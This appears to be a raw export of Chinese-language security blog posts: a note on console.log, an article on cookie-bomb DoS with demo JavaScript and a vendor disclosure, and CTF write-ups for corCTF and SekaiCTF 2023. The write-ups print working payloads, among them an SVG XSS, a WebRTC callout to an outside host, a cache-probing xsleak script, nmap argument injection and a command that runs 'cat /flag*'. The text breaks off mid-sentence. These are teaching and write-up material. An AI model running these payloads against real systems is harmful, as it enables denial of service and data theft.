inconsistency with objects and arrays console.log() shows the changed value of a variable before the value actually changes Is Chrome’s JavaScript console lazy about evaluating arrays? 在各個瀏覽器的 issue tracker 也可以找到相關紀錄： Webkit: Bug 35801 - Web Inspector: generate preview for the objects dumped into the console upon logging. Mozilla: console.log doesn’t show objects at the time of logging if console is closed Chromium: Issue 1041063: console.log() does not log the correct fields of an object at the instant it is called Chromium: Issue 760776: Console Array data updates after console.log 連 MDN 對於 console.log 的文件，都有一塊特別講這個問題： Don’t use console.log(obj), use console.log(JSON.parse(JSON.stringify(obj))). This way you are sure you are seeing the value of obj at the moment you log it. Otherwise, many browsers provide a live view that constantly updates as values change. This may not be what you want. 在上面的連結裡面也都有人出來解釋為什麼會有這個問題，還有為什麼沒辦法修掉。 首先呢，在 devtool 打開的情形下，preview 的內容基本上都是對的，所以這一點完全沒問題。但是把 object 展開以後，顯示的並不是 log 當下的值，而是物件最新的狀態，就是這點造成大家混淆，因為開發者會預期儘管把 object 展開，應該也要是 log 當下的狀態才對。 但如果要達成這個功能，每一次 console.log，瀏覽器就要把當下的值都複製一份起來，才能保證使用者在展開 object 時能看到 log 當時的內容。 套用上面 Issue 其他人的話，他們是這麼說的： We can’t get a copy of the heap every time you console.log… I don’t think we are ever going to fix this one. We can’t clone object upon dumping it into the console and we also can’t listen to the object properties’ changes in order to make it always actual. 所以在實作上有困難，沒辦法做這件事。既然沒辦法修好，那就只能多留意這種情形了，一定要記得使用console.log印出物件的時候： Preview 基本上是正確的（如果你 log 的時候 devtool 就有開著） 展開後所看到的完整資料會是物件最新的狀態，而不是 log 當時的狀態。 Chrome 在 console 裡面其實有加上一個貼心的小 icon 提醒你這件事： 對付問題的方法解決方法上面 MDN 其實就有寫到了，就是在印出物件時利用 JSON.parse(JSON.stringify(obj)) 把物件當下的狀態複製起來，然後重新產生一個物件（就是俗稱的深拷貝啦），就能確保印出來的是當前的狀態了，像是這樣： function log() &#123; var obj = &#123;value: 'before'&#125; console.log('before:', cp(obj)) obj.value = 'after' console.log('after:', cp(obj)) &#125; function cp(obj) &#123; return JSON.parse(JSON.stringify(obj)) &#125; 或者還有一個方法，那就是盡量不要把整個物件給印出來。與其印出整個物件，不如印出你真正想要觀察的值。 或是乾脆直接用 debugger 把程式給暫停再來看當前的值是多少，這也是一種方法。 總結許多新手在接觸 console.log 時一不小心就會踩到這個坑，然後過了許久才發現根本不是自己程式碼的問題，是 log 出來的內容跟想像中不同。所以希望這篇可以讓大家都知道有這個問題存在，以後在使用 console.log 印出物件時，就可以多留意一下這個狀況。 話說，基本上我個人在印物件時還是會直接使用 console.log 而不是採用上面提到的方法，因為直接印還是比較方便一點。但因為我知道console.log有這個問題，所以一旦我發現我印出來的物件跟想像中不一樣，就會改用上面提到的深拷貝來複製值，確認到底是哪裡有問題。 最後，請大家記得 array 也是物件的一種，所以陣列也會有同樣的情形發生。","link":"/2020/03/23/console-log-bug/"},{"title":"利用 Cookie 特性進行的 DoS 攻擊：Cookie 炸彈","text":"前言在網站相關的攻擊手法上，大家比較常看見的應該是 XSS、SQL injection 或是 CSRF 這些方法，而今天要介紹的是另外一種大家可能聽過但沒有這麼熟悉的：DoS，Denial-of-Service 攻擊。 講到 DoS，多數人可能都會想到是不是要送很多封包給網站，然後讓網站伺服器來不及回應或是資源耗盡才能達成目標。或也可能想到的是 DDoS（Distributed Denial-of-Service），不是一台主機而是一堆主機同時送封包給某個伺服器，然後把它打掛。 DoS 與 DDoS 其實有分不同層的攻擊，這些層對應到大家以前可能學過的 OSI Model，例如說大家記憶中的攻擊比較像是 L3 網路層與 L4 傳輸層的攻擊，詳細的攻擊手法可以參考：什麼是 DDoS 攻擊？ 以及 How do layer 3 DDoS attacks work? | L3 DDoS。 但這篇想跟大家分享的攻擊手法，是存在於 L7 應用層的 DoS 攻擊。 例如說某個網站有個 API 可以查詢資料，然後有設一個預設的 limit 是 100，結果我把它改成 10000 之後發現 server 大概要一分多鐘才能給我 response，於是我就每兩秒送一個 request，送著送著就發現網站越變越慢，最後整個掛掉只能回 500 Internal Server Error，這就是應用層的 DoS 攻擊。 只要能找到一個方法讓使用者無法存取網站，就是一種 DoS 的攻擊。而我們找出的方法是建立於 L7 應用層，所以是 L7 的 DoS 攻擊。 在眾多 L7 DoS 攻擊手法中有一種我覺得特別有趣，那就是 Cookie Bomb，直翻就叫做 Cookie 炸彈。 什麼是 Cookie？如果對 cookie 毫無概念的話，可以參考這篇：白話 Session 與 Cookie：從經營雜貨店開始。 簡單來說呢，一些網站可能會把某些資料存在瀏覽器裡面，而這些資料就稱之為 cookie。當瀏覽器對網站發送 request 的時候，會自動把之前儲存的 cookie 一併帶上去。 最常見的應用之一就是廣告追蹤，例如說我造訪 A 網站，然後 A 網站裡面有 GA（Google Analytics）的 script，因此 GA 寫了一個 id&#x3D;abc 的 cookie。當使用者造訪 B 網站而且 B 網站也有裝 GA，此時瀏覽器送 request 給 GA 的時候，就會把這個 id&#x3D;abc 帶上去，那 server 收到以後就會知道「又是這個人，他造訪了 A 網站跟 B 網站」，隨著使用者造訪的網站變多，就會更清楚知道他的喜好。 （附註：實際上的追蹤應該會更複雜，而且最近又有第三方 cookie 的問題，所以實作可能會不太一樣，這邊只是簡單舉例） 在寫入 cookie 的時候，有一個 domain 的選項可以設置，你只能往上寫不能往下寫。什麼意思呢，假設你在 abc.com，你就只能寫 cookie 到 abc.com。但如果你在 a.b.abc.com，你可以寫入 a.b.abc.com，也可以寫入 b.abc.com，就連 abc.com 也可以。 所以你在 subdomain a.b.abc.com 對 root domain abc.com 寫入 cookie 之後，瀏覽器送去 abc.com 的 request 就會帶上你寫入的 cookie。 那 Cookie bomb 又是什麼？假設我的攻擊目標是 example.com，那我只要找到任何 subdomain 或是網站中的某個頁面可以讓我寫 cookie 的話，我就可以自由自在地寫入我想要的 cookie。 舉例來說，假設有個頁面https://example.com/log?uid=abc，造訪這個頁面之後，就會把 uid=abc 這一段寫到 cookie，那我只要把網址改成 ?uid=xxxxxxxxxx，就可以把 xxxxxxxxxx 寫到 cookie 裡。 再舉個例子，假設有個部落格網站，每一個使用者都有一個獨特的 subdomain，例如說我的話就是 huliblog.example.com，然後部落格可以客製化自己想要的 JS，那我就可以利用 JS 在 huliblog.example.com 對 examepl.com 寫入我想要的 cookie。 好了，那可以寫入任意 cookie 之後能幹嘛呢？ 開始寫一堆垃圾 cookie 進去。 例如說 a1=o....*4000 之類的，就是寫一堆無意義的內容進去就好，這邊要特別注意的是一個 cookie 能寫的大小大概是 4kb，而我們最少需要兩個 cookie，也就是要能寫入 8kb 的資料，才能達成攻擊。 當你寫了這些 cookie 進去之後，回到主頁 https://example.com 時，根據 cookie 的特性，就會一起把這些垃圾 cookie 帶上去給 server 對吧？接下來就是見證奇蹟的時刻。 Server 並沒有顯示你平常會看到的頁面，而是回給你一個錯誤：431 Request Header Fields Too Large。 在眾多 HTTP status code 裡面，有兩個 code 都跟 request 太大有關： 413 Payload Too Large 431 Request Header Fields Too Large 假設有個表單，你填了一百萬個字送到 server 去，就很可能會收到一個 413 Payload Too Large 的回應，就如同錯誤訊息所說的，payload 太大了，伺服器無法處理。 而 header 也是一樣的，當你的 cookie 太多時，requset header 中的 Cookie 會很大，大到伺服器無法處理，就會回一個 431 Request Header Fields Too Large（不過根據實測，有些 server 可能會根據實作不同回覆不同的 code，像微軟就是回 400 bad request）。 因此我們只要能把使用者的 cookie 塞爆，就能讓他看到這個錯誤畫面，沒有辦法正常存取服務，這就是 cookie bomb，藉由一大堆 cookie 所引發的 DoS 攻擊。而背後的原理就是「瀏覽器造訪網頁時，會自動把相對應的 cookie 一起帶上去」。 Cookie bomb 這名詞最早的起源應該是 2014 年 1 月 18 日由 Egor Homakov 所發表的 Cookie Bomb or let’s break the Internet.，但類似的攻擊手法在 2009 年就有出現過：How to use Google Analytics to DoS a client from some website 攻擊流程如同上面那段所說，假設我們現在發現一個網址 https://example.com/log?uid=abc 可以讓我們設置任意 cookie，接下來要做的事情就是： 把網址改一下，讓 cookie 變很大，想辦法讓大小超過 8kb（因為似乎比較多 server 的限制都是 8kb） 把這個網址傳給攻擊目標，並想辦法讓他點開 目標點了網址，在瀏覽器上面設了一個很大的 cookie 目標造訪網站 https://example.com，發現看不到內容，只能看到一片白或是錯誤訊息，攻擊成功 這時候除非使用者換個瀏覽器或是 cookie 過期，又或者是自己去把 cookie 清掉，否則一直都會是這個狀態。 綜合以上所述，這個攻擊只能攻擊特定使用者，而且必須滿足兩個前提： 找到一個地方可以設置任意 cookie 目標必須點擊步驟一所找到的網址 有關於實際的攻擊案例，可以參考： Overflow Trilogy #777984 Denial of Service with Cookie Bomb #57356 DOM based cookie bomb #847493 Cookie Bombing cause DOS - businesses.uber.com #105363 [livechat.shopify.com] Cookie bomb at customer chats 再繼續針對攻擊面往下講以前，先來提一下防禦方式。 防禦方式第一點就是不要相信使用者的輸入，例如說上面提到的那個例子：https://example.com/log?uid=abc，不該把 abc 直接寫進 cookie 裡面，而是應該做個基本檢查，例如說格式或是長度之類的，就可以避免掉這類型的攻擊。 再來的話，當我提到可以從 subdomain 往 root domain 設 cookie 時，許多人應該都會想到一件事：「那共用的 subdomain 怎麼辦？」 例如說 GitHub Pages 這功能，每個人的 domain 都是 username.github.io ，那我不就可以用 cookie 炸彈，炸到所有的 GitHub Pages 嗎？只要在我自己的 subdomain 建一個惡意的 HTML，裡面有著設定 cookie 的 JS code，再來只要把這個頁面傳給任何人，他點擊之後就沒辦法訪問任何 *.github.io 的資源，因為都會被 server 拒絕。 這個假說看似是成立的，但其實有個前提要先成立，那就是：「使用者可以在 *.github.io 對 github.io 設置 cookie」。如果這個前提不成立，那 cookie bomb 就無法執行了。 事實上，像是這種「不想要共同的上層 domain 可以被設置 cookie」的需求其實不少，例如說 a.com.tw 如果可以設置 cookie 到 .com.tw 或是 .tw 的話，是不是一大堆不相關的網站都會共享到 cookie 了？這樣顯然是不合理的。 又或者是總統府的網站 https://www.president.gov.tw，應該不會想被財政部的網站 https://www.mof.gov.tw 所影響，因此 .gov.tw 應該也要是一個不給設定 cookie 的 domain。 當瀏覽器在決定能不能對某個 domain 設置 cookie 時，會參照一個清單叫做 public suffix list，出現在上面的 domain，其 subdomain 都沒辦法直接設定該 domain 的 cookie。 例如說以下 domain 都在這份清單上： com.tw gov.tw github.io 所以前面舉的例子不成立了，因為我在 userA.github.io 的時候，沒辦法設置 github.io 的 cookie，所以無法執行 cookie bomb 攻擊。 關於 public suffix list，Heroku 有一篇文特別在介紹它的一些歷史沿革：Cookies and the Public Suffix List。 攻擊面擴展上面有講到兩個攻擊成立的前提： 找到一個地方可以設置任意 cookie 目標必須點擊步驟一所找到的網址 如果想讓攻擊變得更容易成立，就可以針對這兩個前提去想說： 有沒有可能這個地方很好找？ 有沒有可能目標不需要點擊連結就會中招？ 先針對第二點來講，如果可以利用快取污染（Cache poisoning）的話，就可以輕易達成。先簡單講一下什麼是 cache poisoning，簡單來說就是想辦法讓 cache server 存的 cache 是壞掉的那一份（例如說 431 status code 的那一份），這樣不只你，而是所有其他使用者都會因為 cache 的關係，拿到壞掉的檔案，看到同樣的錯誤訊息。 這樣的話，目標不需要點擊任何東西就會中招，而且攻擊對象就從一個人擴大成所有人。 其實第二點有個專有名詞：CPDoS（Cache Poisoned Denial of Service），而且因為是利用 cache 的關係，所以也沒有必要設置 cookie 了，用其他的 header 也行，不需要侷限在 cookie bomb。 更詳細的相關攻擊手法可以參考：https://cpdos.org/ 而第一點「有沒有可能這個地方很好找？」就是我真正想提的。 在針對這點繼續往下之前，其實 cookie bomb 還有更多的攻擊面擴展，可以搭配其他的攻擊手法一起使用，相關的說明以及實際案例很推薦大家去看這個影片：HITCON CMT 2019 - The cookie monster in your browsers，裡面除了 cookie bomb 以外，也提到了其他 cookie 相關的特性。 這場演講裡面利用 cookie bomb 造成的 DoS 搭配其他手法的攻擊方式，真的很漂亮。 找到輕易設置 cookie 的地方有什麼地方可以讓我們輕易設置 cookie，達成 cookie bomb 呢？有，那就是像之前所提過的共用的 subdomain，像是 *.github.io 這一種。 可是這種的不是都在 public suffix list 裡面了嗎？沒有辦法設置 cookie。 只要找到沒有在裡面的就好啦！ 不過這其實也不是件容易的事情，因為你會發現你知道的服務幾乎都已經註冊了，例如說 GitHub、AmazonS3、Heroku 以及 Netlify 等等，都已經在上面了。 不過我有找到一個沒在上面的，那就是微軟提供的 Azure CDN：azureedge.net 不知道為什麼，但這個 domain 並不屬於 public suffix，所以如果我自己去建一個 CDN，就可以執行 cookie bomb。 實際測試我用來 demo 的程式碼如下，參考並改寫自這裡： const domain = 'azureedge.net' const cookieCount = 40 const cookieLength = 3000 const expireAfterMinute = 5 setCookieBomb() function setCookie(key, value) &#123; const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000); document.cookie = key + '=' + value + '; path=/; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString() &#125; function setCookieBomb() &#123; const value = 'Boring' + '_'.repeat(cookieLength) for (let i=0; i&lt;cookieCount; i++) &#123; setCookie('key' + i, value); &#125; &#125; 接著在 Azure 上面上傳檔案然後設置一下 CDN，就可以得到一個自訂的網址：https://hulitest2.azureedge.net/cookie.html （我的 azure 過期了，所以現在點進去應該會壞掉） 點了之後就會在 azureedge.net 上面設置一堆垃圾 cookie： 重新整理後，會發現網站真的不能存取了： 這就代表 cookie bomb 成功了。 所以只要是放在 azureedge.net 的資源，都會受到影響。 其實 AzureCDN 有自訂網域的功能，所以如果是自訂網域的話就不會受到影響。但有些網站並沒有使用自訂網域，而是直接使用了 azureedge.net 當作 URL。 大多數情況下，azureedge.net 都是拿來 host 一些資源，例如說 JS 以及 CSS 或者是圖片，我們可以隨便找一個把資源放在 azureedge.net 的網站來試試看攻擊是否有效。 一開始進去一切都很好，沒什麼問題，但是先造訪過 cookie bomb 那個網址後重新整理，發現整個網頁都跑板了，就是因為 cookie bomb 造成那些資源無法載入： 雖然說沒辦法讓整個網頁無法讀取，但大幅度跑版外加功能壞掉，基本上也是沒辦法使用了。 甚至連微軟自己的一些服務也會被這個攻擊影響，因為也把資源放在 azureedge.net 上面： 防禦方式最好的防禦方式就是改用自訂網域，不要用預設的 azureedge.net，這樣就不會有 cookie bomb 的問題。但撇開自訂網域不談，其實 azureedge.net 應該去註冊 public suffix 才對，不讓使用者在這 domain 上面設置 cookie。 除了這兩種防禦方式之外，還有一種你可能沒想到的。 我們平常在引入資源的時候不是都這樣嗎：&lt;script src=&quot;htps://test.azureedge.net/bundle.js&quot;&gt;&lt;/script&gt;。 只要加一個屬性 crossorigin，變成：&lt;script src=&quot;htps://test.azureedge.net/bundle.js&quot; crossorigin&gt;&lt;/script&gt;，就可以避免掉 cookie bomb 的攻擊。 這是因為原本的方法在發送 request 時會把 cookie 帶上去，但如果加上 crossorigin 改成用 cross origin 的方式去拿，預設就不會帶 cookie，所以就不會有 header too large 的狀況發生。 只是記得在 CDN 那邊也要調整一下，要確認 server 有加上 Access-Control-Allow-Origin 的 header，允許跨來源的資源請求。 以前我很困惑到底什麼情形需要加上 crossorigin，現在我知道其中一種了，如果你不想把 cookie 一起帶上去的話，就可以加上 crossorigin。 再看一個例子曾經在特定領域紅過，但被 Automattic 收購後便轉向的 Tumblr 有個特別的功能，那就是你可以在個人頁面自訂 CSS 與 JavaScript，而這個個人頁面的 domain 會是 userA.tumblr.com，而 tumblr.com 並沒有註冊在 public suffix 上，所以一樣會受 cookie bomb 的影響： 造訪這個網址：https://aszx87410.tumblr.com/ 之後重新整理或者是前往 Tumblr 首頁，就會發現無法存取（寫 cookie 的 JS 沒寫好，只在 Chrome 上有用，Firefox 不行）： 後續回報2021-06-16 我在 HackerOne 上面回報了 Tumblr 的 cookie bomb 問題，隔天就收到回覆，對方回說： this behavior does not pose a concrete and exploitable risk to the platform in and on itself, as this can be fixed by clearing the cache, and is more of a nuisance than a security vulnerability 對有些公司來說，如果只有 cookie bomb 的話造成的危害太小，而且第一受害者必須點那個網址，第二只要把 cookie 清掉就沒事，所以並不認可這是一個安全性的漏洞。 而微軟那邊則是在 2021-06-10 透過 MSRC 回報，大約兩週後 2021-06-22 收到回覆，對方說已經回報相關的團隊進行處理，但是這個問題並沒有達到 security update 的標準，之後修好也不會有通知。 後來寫信去問那能不能把這個問題當成範例寫在 blog，2021-06-30 收到回覆說 OK。 結語我以前關注的漏洞大多數都是像 SQL Injection 或是 XSS 那樣子的，能夠偷走使用者的資料，但前陣子突然發現 DoS 這類型的漏洞很多也都很有趣，尤其是應用層的 DoS，比如說這一篇提到的 cookie bomb，或者是利用 RegExp 達成的 ReDoS，還有 GraphQL 的 DoS 等等。 雖然說單純的 cookie bomb 如果沒有結合其他的攻擊手法，影響力十分有限，而且只要清掉 cookie 就沒事了，但我覺得還是一個挺有趣的攻擊，畢竟我本來就對 cookie 相關的東西都很感興趣（可能是因為以前有被殘害過）。 但其實這樣研究下來，除了覺得 cookie bomb 很有趣之外，還有個東西讓我收穫良多，眼界大開，就是前面貼的那個 HITCON CMT 2019 - The cookie monster in your browsers 影片中提到的利用 cookie bomb 結合其他攻擊手法。 在資安的領域中怎麼把不同的，看似很小的一些問題串在一起變成大問題，一直以來都是一門藝術。只有 cookie bomb 可能做不了什麼，但跟其他東西結合之後搞不好可以昇華出一個嚴重的漏洞。目前我個人學藝不精，沒辦法達到那種程度，但我相信有朝一日可以的。 總之呢，這篇文章就是跟大家稍微介紹一下 cookie bomb 的成因以及修復方式，如果你的服務會提供 subdomain 給使用者，記得評估一下是否需要去 public suffix list 上面註冊，避免 subdomain 寫 cookie 到 root domain，進而影響到所有的 subdomain。","link":"/2021/07/10/cookie-bomb/"},{"title":"corCTF 2023 & Sekai CTF 2023 筆記","text":"這兩場都有稍微參加一下，但不是每一題都有看，這篇純粹做個筆記而已，稍微記一下解法，不會太詳細。 老樣子，筆記一下關鍵字： GraphQL batch query + alias Python os.path.join 絕對路徑 Svg XSS, foreignObject WebRTC CSP bypass Status code xsleak DNS rebinding nmap command injection ruby rack 上傳檔案暫存 buildConstraintViolationWithTemplate EL injection request smuggling document.baseURI 200&#x2F;404 status code xsleak corCTF 2023題目的原始碼都在這邊：https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web部分 web 題的 writeup：https://brycec.me/posts/corctf_2023_challenges force (118 solves)pin 碼的值有 10000 種可能，需要在 10 個 request 以內用 GraphQL query 找出正確的值。 解法就是用 batch query + alias，一個請求就可以試很多次（取自底下的文章）： &#123; flag0:flag(pin:0), flag1:flag(pin:1), flag2:flag(pin:2), flag3:flag(pin:3), flag4:flag(pin:4), flag5:flag(pin:5) &#125; 其他人的 writeup： https://siunam321.github.io/ctf/corCTF-2023/web/force/ https://github.com/hanzotaz/corctf2023_writeup/ msfrognymize (64 solves)重點是底下這一段的程式碼： @app.route('/anonymized/&lt;image_file>') def serve_image(image_file): file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file)) if \"..\" in file_path or not os.path.exists(file_path): return f\"Image &#123;file_path&#125; cannot be found.\", 404 return send_file(file_path, mimetype='image/png') Python 的 os.path.join 有一個眾所皆知的行為是當你要 join 的東西是一個絕對路徑的時候，前面都會被忽略： &gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;test.txt&#39;) &#39;&#x2F;tmp&#x2F;abc&#x2F;test.txt&#39; &gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;&#x2F;test.txt&#39;) &#39;&#x2F;test.txt&#39; 因此這題利用這個特性就可以做到任意讀檔，拿到 flag。 參考資料：https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/ frogshare (33 solves)這題使用了一個叫做 svg-loader 的 library，可以自動載入一個 SVG URL，因此這題是基於 SVG 的 XSS。 在引入的時候為了安全性，會自動把 script 以及 inline script 等等的東西移除，但是漏掉了 &lt;foreignObject&gt; 這個東西，這標籤可以讓你在 SVG 裡面載入 HTML，搭配 iframe srcdoc 來使用就可以繞過： &lt;?xml version=\"1.0\" standalone=\"no\"?> &lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> &lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> &lt;polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/> &lt;foreignObject> &lt;iframe srcdoc=\"&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;\">&lt;/iframe> &lt;/foreignObject> &lt;/svg> 再來就是繞過 CSP，這題最後是用 &lt;base&gt; 來改變 script 載入的位置來達成。 參考資料： https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/ 而 Renwa 的解法則是在 iframe 裡面重建 app，並藉由 Next.js 的特性來插入 script：https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd youdirect (5 solves)這題就是找到 YouTube 上的 open redirect，簡單明瞭。 @EhhThing 提供的（點了會登出），串了兩層 open redirect： https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394 @pew 提供的：https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew @Josh 提供的：https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&amp;q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&amp;v=-5Rm9ymMTRA&amp;html_redirect=1 這個比較特別，其實 YouTube 影片敘述的連結每一個都會產生一個 redirect link，但是在網頁上都有綁定 session ID，所以換個裝置就不能使用了，而這個是在 mobile app 上面產生的，可以是因為 mobile app 沒有 cookie 所以不受限制，有趣。 crabspace (4 solves)第一步是用 tera 的 SSTI leak 出環境變數：&#123;&#123; get_env(name=\"SECRET\") &#125;&#125; 再來可以用 WebRTC 去繞過 CSP： &lt;script> async function a()&#123; c=&#123;iceServers:[&#123;urls:\"stun:&#123;&#123;user.id&#125;&#125;.x.cjxol.com:1337\"&#125;]&#125; (p=new RTCPeerConnection(c)).createDataChannel(\"d\") await p.setLocalDescription() &#125; a(); &lt;/script> 有了這兩個之後就可以偽造出一個 admin session 然後拿到 flag。 參考資料： corCTF 2023 web&#x2F;crabspace Writeup leakynote (3 solves)這題在比賽中的時候有解開，簡單來講就是給你一個 free HTML injection 以及嚴格的 CSP： Content-Security-Policy &quot;script-src &#39;none&#39;; object-src &#39;none&#39;; frame-ancestors &#39;none&#39;;&quot;; 然後有一個 search API，成功會回傳 200，失敗回傳 404，要想辦法利用這個去 leak flag。 這題的重點之一是 CSP header 是 nginx 加上的，而 nginx 只有對 2xx 跟 3xx 會加上 header，因此如果搜尋失敗回傳 404，這個頁面是不會有 CSP 的。 因此我那時候就想出了一個用 cache probing 的方式。 我們在 note 裡面插入 &lt;iframe src=search?q=a&gt;，如果沒有找到東西，那就沒有 CSP，所以 iframe 的內容會被載入，頁面上的 CSS 也會被載入。反之，因為違反 CSP，沒有東西會被載入。 因此可以透過「CSS 有沒有被放到 cache 中」這點去 leak 出搜尋有沒有找到東西。 那時候實作的程式碼如下： &lt;script> const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)) async function clearCache() &#123; let controller = new AbortController(); let signal = controller.signal; fetch('https://leakynote.be.ax/assets/normalize.css',&#123; mode: \"no-cors\", signal: signal, cache: 'reload' &#125;) await sleep(0) controller.abort(); await sleep(100) &#125; async function testNote(title, url) &#123; // open note page var w = window.open(url) // wait 1s await sleep(1000) // clear cache and wait again await clearCache() await sleep(1500) // now the iframe should load, do cache probing const now = performance.now() await fetch('https://leakynote.be.ax/assets/normalize.css', &#123; mode: 'no-cors', cache: 'force-cache' &#125;) const end = performance.now() fetch(`/report?title=$&#123;title&#125;&amp;ms=$&#123;end-now&#125;`) if (end-now >= 4) &#123; fetch('/maybe/' + title) &#125; // cached(no result) => 2~3ms // no cache(found) => 4.8~5.8ms w.close() &#125; // copy paste the following from python script async function main() &#123; await testNote('&#123;a','https://leakynote.be.ax/post.php?id=c9193aee91b0fc29') await testNote('&#123;c','https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2') await testNote('&#123;d','https://leakynote.be.ax/post.php?id=0c6caa61575b9478') await testNote('&#123;e','https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be') await testNote('&#123;f','https://leakynote.be.ax/post.php?id=71652df64d54c0e4') await testNote('&#123;g','https://leakynote.be.ax/post.php?id=354f3bec25e02332') await testNote('&#123;k','https://leakynote.be.ax/post.php?id=066aa475493e1a4c') await testNote('&#123;l','https://leakynote.be.ax/post.php?id=54a12f7b11098d2a') await testNote('&#123;o','https://leakynote.be.ax/post.php?id=621591145bcfc8e0') await testNote('&#123;r','https://leakynote.be.ax/post.php?id=6b44725cb5e274f0') await testNote('&#123;t','https://leakynote.be.ax/post.php?id=e025b26e5e7117a1') await testNote('&#123;y','https://leakynote.be.ax/post.php?id=f10001d89230485e') await testNote('&#123;z','https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad') &#125; main() &lt;/script> 賽後看到另外兩位的解法也很有趣，其中一個是透過載入字體來 leak，當你這樣做的時候： @font-face &#123; font-family: a; src: url(/time-before),url(/search.php?query=corctf&#123;a),url(/search.php?query=corctf&#123;a),... /*10000 times */,url(/time-after) &#125; Chrome 會根據 status code 來判斷怎麼處理，如果是 200 就會偵測是不是合法的字體，如果是 404 就直接失敗，因此可以用字體載入的時間來判斷 status code。 ref: https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45 另一位也是利用 CSS 檔案有沒有載入的特性，只是不是利用 cache，而是利用一次打開大量頁面造成 server side 忙碌，響應時間變慢，透過這點來判斷。 ref: https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09 pdf-pal (2 solves)這題的 nginx config 長這樣： location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;localhost:7777; location ^~ &#x2F;generate &#123; allow 127.0.0.1; deny all; &#125; location ^~ &#x2F;rename &#123; allow 127.0.0.1; deny all; &#125; &#125; 所以照理來說是無法訪問到 /generate 路徑，但可以利用 gunicorn 跟 nginx 的 parser 差異來繞過： POST &#x2F;generate&#123;chr(9)&#125;HTTP&#x2F;1.1&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1 相關 ticket：https://github.com/benoitc/gunicorn/issues/2530 繞過之後就可以用 /generate 的功能去產生 PDF，但是因為這個 service 本身有擋一些 block list，所以沒辦法直接把 flag 變成 PDF。 解法是利用 DNS rebinding 去 POST http://localhost:7778，就可以拿到 response。 例如說我們現在有個 domain example.com，背後有兩個 A record，一個指向真的 ip，另一個指向 0.0.0.0，這時候 admin bot 訪問 http://example.com:7778/，解析真的 IP，成功取得頁面。 這時我們把 server 關掉，然後去執行 fetch(&#39;http://example.com:7778/generate&#39;)，此時因為原本的 ip 已經無法訪問，瀏覽器就會轉為 0.0.0.0，成功把 request 發到我們想要的位置，也因為是 same-origin 所以可以拿到 response。 更多細節可以參考： https://github.com/nccgroup/singularity https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves) lemon-csp (1 solve)找到 0 day 的 CSP bypass，沒有公開解法。 0day (1 solve)這題是找到 VM2 的 1day，沒有公開解法。 SekaiCTF 2023題目的原始碼都在這裡：https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web Scanner Service (146 solves)輸入 port 跟 host，會執行底下程式碼： nmap -p #&#123;port&#125; #&#123;hostname&#125; 但是傳入的資料會先經過 sanitizer，有字元限制。 tab 可以用，所以可以用 tab 來新增參數，比賽中的時候是用了 -iL /flag.txt -oN - 來過關的，把輸出導到 stdout，或是用 /dev/stdout 也成立。 官方的 writeup 是先用 http-fetch 這個 script 把檔案下載到本機，再跑一次 nmap --script 去執行那個腳本： --script http-fetch -Pn --script-args http-fetch.destination&#x3D;&#123;DOWNLOAD_DIR&#125;,http-fetch.url&#x3D;&#123;NSE_SCRIPT&#125; --script&#x3D;&#123;DOWNLOAD_DIR&#125;&#x2F;&#123;LHOST&#125;&#x2F;&#123;LPORT&#125;&#x2F;&#123;NSE_SCRIPT&#125; 在 Discord 中看到 @zeosutt 提供另外一種有趣的解法是運用了 rack 上傳檔案會留在 /tmp/ 中的技巧，直接引入上傳的檔案就好： curl http:&#x2F;&#x2F;35.231.135.130:32190&#x2F; -F $&#39;service&#x3D;127.0.0.1:1337\\t--script\\t&#x2F;tmp&#x2F;RackMultipart?????????????????&#39; -F &#39;&#x3D;os.execute(&quot;cat &#x2F;flag*&quot;);filename&#x3D;evil&#39; Frog-WAF (29 solves)buildConstraintViolationWithTemplate 有 EL injection 的問題，剩下的是繞過 WAF。 之前有實際的產品就是出過一樣的洞： Expression Language Injection in Netflix Conductor CVE-2020-9296-Netflix-Conductor-RCE-漏洞分析 怎麼繞的部分可以參考底下幾篇： https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00 Chunky (16 solves)這題有一個 cache server + backend server，請求都會先通過 cache server 再到 backend 去，然後留一份快取在 cache 